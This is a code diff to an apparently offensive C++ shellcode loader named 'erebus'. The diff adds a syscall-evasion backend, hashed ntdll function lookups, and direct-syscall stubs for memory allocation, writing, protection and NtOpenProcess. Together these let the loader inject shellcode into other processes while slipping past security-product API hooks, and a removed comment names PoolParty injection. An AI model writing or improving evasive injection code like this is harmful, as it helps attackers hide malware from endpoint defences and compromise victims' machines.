@@ -1,4 +1,5 @@
 #include "../../include/loader.hpp"
+#include "../../include/evasion/syscall_backend.hpp"
 
 namespace erebus {
 	BOOL StageResource(IN int resource_id, IN LPCWSTR resource_class, OUT PBYTE* shellcode, OUT SIZE_T* shellcode_size)
@@ -56,18 +57,36 @@ namespace erebus {
 			return NULL;
 		}
 
-		// Use standard Windows API instead of PEB-based resolution for MinGW compatibility
-		HMODULE ntdll = ImportModule("ntdll.dll");
+		HMODULE ntdll = erebus::GetModuleHandleC(H("ntdll.dll"));
 		if (!ntdll)
 		{
 			LOG_ERROR("Failed to get ntdll.dll handle");
 			return NULL;
 		}
 
-		ImportFunction(ntdll, NtAllocateVirtualMemory, typeNtAllocateVirtualMemory);
-		ImportFunction(ntdll, NtWriteVirtualMemory, typeNtWriteVirtualMemory);
-		ImportFunction(ntdll, NtProtectVirtualMemory, typeNtProtectVirtualMemory);
-		ImportFunction(ntdll, NtFreeVirtualMemory, typeNtFreeVirtualMemory);
+		typeNtAllocateVirtualMemory NtAllocateVirtualMemory =
+			(typeNtAllocateVirtualMemory)erebus::evasion::GetSyscallStub(H("NtAllocateVirtualMemory"));
+		if (!NtAllocateVirtualMemory)
+			NtAllocateVirtualMemory = (typeNtAllocateVirtualMemory)
+				erebus::GetProcAddressC(ntdll, H("NtAllocateVirtualMemory"));
+
+		typeNtWriteVirtualMemory NtWriteVirtualMemory =
+			(typeNtWriteVirtualMemory)erebus::evasion::GetSyscallStub(H("NtWriteVirtualMemory"));
+		if (!NtWriteVirtualMemory)
+			NtWriteVirtualMemory = (typeNtWriteVirtualMemory)
+				erebus::GetProcAddressC(ntdll, H("NtWriteVirtualMemory"));
+
+		typeNtProtectVirtualMemory NtProtectVirtualMemory =
+			(typeNtProtectVirtualMemory)erebus::evasion::GetSyscallStub(H("NtProtectVirtualMemory"));
+		if (!NtProtectVirtualMemory)
+			NtProtectVirtualMemory = (typeNtProtectVirtualMemory)
+				erebus::GetProcAddressC(ntdll, H("NtProtectVirtualMemory"));
+
+		typeNtFreeVirtualMemory NtFreeVirtualMemory =
+			(typeNtFreeVirtualMemory)erebus::evasion::GetSyscallStub(H("NtFreeVirtualMemory"));
+		if (!NtFreeVirtualMemory)
+			NtFreeVirtualMemory = (typeNtFreeVirtualMemory)
+				erebus::GetProcAddressC(ntdll, H("NtFreeVirtualMemory"));
 
 		if (!NtAllocateVirtualMemory || !NtWriteVirtualMemory || !NtProtectVirtualMemory || !NtFreeVirtualMemory)
 		{
@@ -153,28 +172,45 @@ namespace erebus {
 	}
 
 	//
-	// Uses OpenProcess to get a handle to the process from a given PID
+	// Uses NtOpenProcess to get a handle to the process from a given PID.
 	// Returns NULL on failure.
 	//
 	HANDLE GetProcessHandle(DWORD process_id)
 	{
-		HANDLE process = INVALID_HANDLE_VALUE;
+		HMODULE ntdll = erebus::GetModuleHandleC(H("ntdll.dll"));
 
-		// Include PROCESS_QUERY_INFORMATION and PROCESS_DUP_HANDLE for PoolParty injection
-		process = OpenProcess(
-			PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_READ | 
-			PROCESS_VM_WRITE | PROCESS_SET_QUOTA | PROCESS_QUERY_INFORMATION | 
-			PROCESS_DUP_HANDLE, 
-			FALSE, process_id);
+		typeNtOpenProcess NtOpenProcess =
+			(typeNtOpenProcess)erebus::evasion::GetSyscallStub(H("NtOpenProcess"));
+		if (!NtOpenProcess && ntdll)
+			NtOpenProcess = (typeNtOpenProcess)
+				erebus::GetProcAddressC(ntdll, H("NtOpenProcess"));
 
-		if (!process || process == INVALID_HANDLE_VALUE)
+		if (!NtOpenProcess)
 		{
-			LOG_ERROR("OpenProcess failed for PID %lu (Error: 0x%08lX)", process_id, GetLastError());
+			LOG_ERROR("Failed to resolve NtOpenProcess");
+			return NULL;
+		}
+
+		HANDLE process = NULL;
+		CLIENT_ID cid = { (PVOID)(ULONG_PTR)process_id, NULL };
+		OBJECT_ATTRIBUTES obj_attr = {};
+		InitializeObjectAttributes(&obj_attr, NULL, 0, NULL, NULL);
+
+		NTSTATUS status = NtOpenProcess(
+			&process,
+			PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_READ |
+			PROCESS_VM_WRITE | PROCESS_SET_QUOTA | PROCESS_QUERY_INFORMATION |
+			PROCESS_DUP_HANDLE,
+			&obj_attr,
+			&cid);
+
+		if (!NT_SUCCESS(status) || !process)
+		{
+			LOG_ERROR("NtOpenProcess failed for PID %lu (NTSTATUS: 0x%08lX)", process_id, status);
 			return NULL;
 		}
 
 		LOG_SUCCESS("Process Handle: 0x%p (PID: %lu)", process, process_id);
-
 		return process;
 	}
 
